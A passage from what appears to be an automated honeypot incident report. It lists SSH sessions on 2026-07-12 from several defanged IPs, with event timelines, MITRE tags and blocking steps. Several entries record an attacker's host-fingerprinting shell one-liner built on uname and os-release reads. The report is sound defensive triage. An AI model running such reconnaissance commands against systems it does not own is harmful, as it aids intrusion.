| `2026-07-12 17:05:28` | `cowrie.command.input` |
| `2026-07-12 17:05:28` | `cowrie.command.input` |
| `2026-07-12 17:05:29` | `cowrie.log.closed` |
| `2026-07-12 17:05:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a3e92e75acc

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-12 17:05 |
| **Last Seen** | 2026-07-12 17:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:05:43` | `cowrie.session.connect` |
| `2026-07-12 17:05:44` | `cowrie.client.version` |
| `2026-07-12 17:05:44` | `cowrie.client.kex` |
| `2026-07-12 17:05:45` | `cowrie.login.success` |
| `2026-07-12 17:05:46` | `cowrie.session.params` |
| `2026-07-12 17:05:46` | `cowrie.command.input` |
| `2026-07-12 17:05:46` | `cowrie.command.input` |
| `2026-07-12 17:05:46` | `cowrie.command.input` |
| `2026-07-12 17:05:46` | `cowrie.command.input` |
| `2026-07-12 17:05:46` | `cowrie.command.input` |
| `2026-07-12 17:05:46` | `cowrie.command.success` |
| `2026-07-12 17:05:46` | `cowrie.command.input` |
| `2026-07-12 17:05:46` | `cowrie.command.input` |
| `2026-07-12 17:05:46` | `cowrie.command.input` |
| `2026-07-12 17:05:46` | `cowrie.command.input` |
| `2026-07-12 17:05:47` | `cowrie.log.closed` |
| `2026-07-12 17:05:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a263da8d4450

| Field | Detail |
|---|---|
| **Source IP** | `117.205.2[.]250` |
| **First Seen** | 2026-07-12 17:06 |
| **Last Seen** | 2026-07-12 17:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:06:57` | `cowrie.session.connect` |
| `2026-07-12 17:06:57` | `cowrie.client.version` |
| `2026-07-12 17:06:57` | `cowrie.client.kex` |
| `2026-07-12 17:06:59` | `cowrie.login.success` |
| `2026-07-12 17:07:00` | `cowrie.direct-tcpip.request` |
| `2026-07-12 17:07:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.205.2[.]250` to AbuseIPDB if not already reported
- [ ] Block `117.205.2[.]250` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59c5622b733d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-12 17:07 |
| **Last Seen** | 2026-07-12 17:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:07:27` | `cowrie.session.connect` |
| `2026-07-12 17:07:28` | `cowrie.client.version` |
| `2026-07-12 17:07:28` | `cowrie.client.kex` |
| `2026-07-12 17:07:31` | `cowrie.login.success` |
| `2026-07-12 17:07:32` | `cowrie.session.params` |
| `2026-07-12 17:07:32` | `cowrie.command.input` |
| `2026-07-12 17:07:32` | `cowrie.command.input` |
| `2026-07-12 17:07:32` | `cowrie.command.input` |
| `2026-07-12 17:07:32` | `cowrie.command.input` |
| `2026-07-12 17:07:32` | `cowrie.command.input` |
| `2026-07-12 17:07:32` | `cowrie.command.success` |
| `2026-07-12 17:07:32` | `cowrie.command.input` |
| `2026-07-12 17:07:32` | `cowrie.command.input` |
| `2026-07-12 17:07:32` | `cowrie.command.input` |
| `2026-07-12 17:07:32` | `cowrie.command.input` |
| `2026-07-12 17:07:32` | `cowrie.log.closed` |
| `2026-07-12 17:07:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecfb1c9d65e0

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-12 17:07 |
| **Last Seen** | 2026-07-12 17:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:07:51` | `cowrie.session.connect` |
| `2026-07-12 17:07:51` | `cowrie.client.version` |
| `2026-07-12 17:07:51` | `cowrie.client.kex` |
| `2026-07-12 17:07:53` | `cowrie.login.success` |
| `2026-07-12 17:07:54` | `cowrie.session.params` |
| `2026-07-12 17:07:54` | `cowrie.command.input` |
| `2026-07-12 17:07:54` | `cowrie.command.input` |
| `2026-07-12 17:07:54` | `cowrie.command.input` |
| `2026-07-12 17:07:54` | `cowrie.command.input` |
| `2026-07-12 17:07:54` | `cowrie.command.input` |
| `2026-07-12 17:07:54` | `cowrie.command.success` |
| `2026-07-12 17:07:54` | `cowrie.command.input` |
| `2026-07-12 17:07:54` | `cowrie.command.input` |
| `2026-07-12 17:07:54` | `cowrie.command.input` |
| `2026-07-12 17:07:54` | `cowrie.command.input` |
| `2026-07-12 17:07:55` | `cowrie.log.closed` |
| `2026-07-12 17:07:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7edde611d68

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-12 17:07 |
| **Last Seen** | 2026-07-12 17:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:07:52` | `cowrie.session.connect` |
| `2026-07-12 17:07:52` | `cowrie.client.version` |
| `2026-07-12 17:07:52` | `cowrie.client.kex` |
| `2026-07-12 17:07:53` | `cowrie.login.success` |
| `2026-07-12 17:07:55` | `cowrie.session.params` |
| `2026-07-12 17:07:55` | `cowrie.command.input` |
| `2026-07-12 17:07:55` | `cowrie.command.input` |
| `2026-07-12 17:07:55` | `cowrie.command.input` |
| `2026-07-12 17:07:55` | `cowrie.command.input` |
| `2026-07-12 17:07:55` | `cowrie.command.input` |
| `2026-07-12 17:07:55` | `cowrie.command.success` |
| `2026-07-12 17:07:55` | `cowrie.command.input` |
| `2026-07-12 17:07:55` | `cowrie.command.input` |
| `2026-07-12 17:07:55` | `cowrie.command.input` |
| `2026-07-12 17:07:55` | `cowrie.command.input` |
| `2026-07-12 17:07:55` | `cowrie.log.closed` |
| `2026-07-12 17:07:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0e9a9ad45dd

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-12 17:09 |
| **Last Seen** | 2026-07-12 17:09 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:09:30` | `cowrie.session.connect` |
| `2026-07-12 17:09:31` | `cowrie.client.version` |
| `2026-07-12 17:09:31` | `cowrie.client.kex` |
| `2026-07-12 17:09:34` | `cowrie.login.success` |
| `2026-07-12 17:09:35` | `cowrie.session.params` |
| `2026-07-12 17:09:35` | `cowrie.command.input` |
| `2026-07-12 17:09:35` | `cowrie.command.input` |
| `2026-07-12 17:09:35` | `cowrie.command.input` |
| `2026-07-12 17:09:35` | `cowrie.command.input` |
| `2026-07-12 17:09:35` | `cowrie.command.input` |
| `2026-07-12 17:09:35` | `cowrie.command.success` |
| `2026-07-12 17:09:35` | `cowrie.command.input` |
| `2026-07-12 17:09:35` | `cowrie.command.input` |
| `2026-07-12 17:09:35` | `cowrie.command.input` |
| `2026-07-12 17:09:35` | `cowrie.command.input` |
| `2026-07-12 17:09:36` | `cowrie.log.closed` |
| `2026-07-12 17:09:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afdf3ebb5e27

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-12 17:09 |
| **Last Seen** | 2026-07-12 17:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:09:51` | `cowrie.session.connect` |
| `2026-07-12 17:09:52` | `cowrie.client.version` |
| `2026-07-12 17:09:52` | `cowrie.client.kex` |
| `2026-07-12 17:09:53` | `cowrie.login.success` |
| `2026-07-12 17:09:54` | `cowrie.session.params` |
| `2026-07-12 17:09:54` | `cowrie.command.input` |
| `2026-07-12 17:09:54` | `cowrie.command.input` |
| `2026-07-12 17:09:54` | `cowrie.command.input` |
| `2026-07-12 17:09:54` | `cowrie.command.input` |
| `2026-07-12 17:09:54` | `cowrie.command.input` |
| `2026-07-12 17:09:54` | `cowrie.command.success` |
| `2026-07-12 17:09:54` | `cowrie.command.input` |
| `2026-07-12 17:09:54` | `cowrie.command.input` |
| `2026-07-12 17:09:54` | `cowrie.command.input` |
| `2026-07-12 17:09:54` | `cowrie.command.input` |
| `2026-07-12 17:09:55` | `cowrie.log.closed` |
| `2026-07-12 17:09:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4685d0417822

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-12 17:10 |
| **Last Seen** | 2026-07-12 17:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:10:06` | `cowrie.session.connect` |
| `2026-07-12 17:10:06` | `cowrie.client.version` |
| `2026-07-12 17:10:06` | `cowrie.client.kex` |
| `2026-07-12 17:10:07` | `cowrie.login.success` |
| `2026-07-12 17:10:08` | `cowrie.session.params` |
| `2026-07-12 17:10:08` | `cowrie.command.input` |
| `2026-07-12 17:10:08` | `cowrie.command.input` |
| `2026-07-12 17:10:08` | `cowrie.command.input` |
| `2026-07-12 17:10:08` | `cowrie.command.input` |
| `2026-07-12 17:10:08` | `cowrie.command.input` |
| `2026-07-12 17:10:08` | `cowrie.command.success` |
| `2026-07-12 17:10:08` | `cowrie.command.input` |
| `2026-07-12 17:10:08` | `cowrie.command.input` |
| `2026-07-12 17:10:08` | `cowrie.command.input` |
| `2026-07-12 17:10:08` | `cowrie.command.input` |
| `2026-07-12 17:10:08` | `cowrie.log.closed` |
| `2026-07-12 17:10:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-664daaddd291

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-12 17:10 |
| **Last Seen** | 2026-07-12 17:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:10:08` | `cowrie.session.connect` |
| `2026-07-12 17:10:08` | `cowrie.client.version` |
| `2026-07-12 17:10:08` | `cowrie.client.kex` |
| `2026-07-12 17:10:09` | `cowrie.login.success` |
| `2026-07-12 17:10:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af84f3ebacce

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-12 17:10 |
| **Last Seen** | 2026-07-12 17:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:10:08` | `cowrie.session.connect` |
| `2026-07-12 17:10:08` | `cowrie.client.version` |
| `2026-07-12 17:10:08` | `cowrie.client.kex` |
| `2026-07-12 17:10:09` | `cowrie.login.success` |
| `2026-07-12 17:10:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86526fa4b364

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-12 17:10 |
| **Last Seen** | 2026-07-12 17:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:10:12` | `cowrie.session.connect` |
| `2026-07-12 17:10:12` | `cowrie.client.version` |
| `2026-07-12 17:10:12` | `cowrie.client.kex` |
| `2026-07-12 17:10:13` | `cowrie.login.success` |
| `2026-07-12 17:10:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7719ad3d82e5

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-12 17:10 |
| **Last Seen** | 2026-07-12 17:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:10:13` | `cowrie.session.connect` |
| `2026-07-12 17:10:13` | `cowrie.client.version` |
| `2026-07-12 17:10:13` | `cowrie.client.kex` |
| `2026-07-12 17:10:13` | `cowrie.login.success` |
| `2026-07-12 17:10:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2bfa12580ea

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-12 17:11 |
| **Last Seen** | 2026-07-12 17:11 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:11:42` | `cowrie.session.connect` |
| `2026-07-12 17:11:43` | `cowrie.client.version` |
| `2026-07-12 17:11:43` | `cowrie.client.kex` |
| `2026-07-12 17:11:46` | `cowrie.login.success` |
| `2026-07-12 17:11:47` | `cowrie.session.params` |
| `2026-07-12 17:11:47` | `cowrie.command.input` |
| `2026-07-12 17:11:47` | `cowrie.command.input` |
| `2026-07-12 17:11:47` | `cowrie.command.input` |
| `2026-07-12 17:11:47` | `cowrie.command.input` |
| `2026-07-12 17:11:47` | `cowrie.command.input` |
| `2026-07-12 17:11:47` | `cowrie.command.success` |
| `2026-07-12 17:11:47` | `cowrie.command.input` |
| `2026-07-12 17:11:47` | `cowrie.command.input` |
| `2026-07-12 17:11:47` | `cowrie.command.input` |
| `2026-07-12 17:11:47` | `cowrie.command.input` |
| `2026-07-12 17:11:47` | `cowrie.log.closed` |
| `2026-07-12 17:11:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da2204473b1b

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-12 17:11 |
| **Last Seen** | 2026-07-12 17:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:11:51` | `cowrie.session.connect` |
| `2026-07-12 17:11:51` | `cowrie.client.version` |
| `2026-07-12 17:11:51` | `cowrie.client.kex` |
| `2026-07-12 17:11:53` | `cowrie.login.success` |
| `2026-07-12 17:11:54` | `cowrie.session.params` |
| `2026-07-12 17:11:54` | `cowrie.command.input` |
| `2026-07-12 17:11:54` | `cowrie.command.input` |
| `2026-07-12 17:11:54` | `cowrie.command.input` |
| `2026-07-12 17:11:54` | `cowrie.command.input` |
| `2026-07-12 17:11:54` | `cowrie.command.input` |
| `2026-07-12 17:11:54` | `cowrie.command.success` |
| `2026-07-12 17:11:54` | `cowrie.command.input` |
| `2026-07-12 17:11:54` | `cowrie.command.input` |
| `2026-07-12 17:11:54` | `cowrie.command.input` |
| `2026-07-12 17:11:54` | `cowrie.command.input` |
| `2026-07-12 17:11:55` | `cowrie.log.closed` |
| `2026-07-12 17:11:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17cd919ed5be

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-12 17:12 |
| **Last Seen** | 2026-07-12 17:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:12:18` | `cowrie.session.connect` |
| `2026-07-12 17:12:18` | `cowrie.client.version` |
| `2026-07-12 17:12:18` | `cowrie.client.kex` |
| `2026-07-12 17:12:19` | `cowrie.login.success` |
| `2026-07-12 17:12:20` | `cowrie.session.params` |
| `2026-07-12 17:12:20` | `cowrie.command.input` |
| `2026-07-12 17:12:20` | `cowrie.command.input` |
| `2026-07-12 17:12:20` | `cowrie.command.input` |
| `2026-07-12 17:12:20` | `cowrie.command.input` |
| `2026-07-12 17:12:20` | `cowrie.command.input` |
| `2026-07-12 17:12:20` | `cowrie.command.success` |
| `2026-07-12 17:12:20` | `cowrie.command.input` |
| `2026-07-12 17:12:20` | `cowrie.command.input` |
| `2026-07-12 17:12:20` | `cowrie.command.input` |
| `2026-07-12 17:12:20` | `cowrie.command.input` |
| `2026-07-12 17:12:21` | `cowrie.log.closed` |
| `2026-07-12 17:12:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
